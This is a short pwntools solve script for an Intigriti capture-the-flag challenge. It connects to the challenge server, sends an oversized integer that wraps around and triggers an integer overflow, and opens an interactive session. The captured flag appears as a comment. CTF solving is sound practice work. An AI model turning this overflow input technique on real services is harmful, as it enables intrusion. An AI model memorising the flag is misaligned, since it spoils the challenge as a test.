#!/usr/bin/env python3
from pwn import *

p = remote("edge.ctf.intigriti.io", 1337)
p.sendline(b'18446744073709550214')
p.interactive()
# INTIGRITI{fUn_w1th_1nt3g3r_0v3rfl0w_11}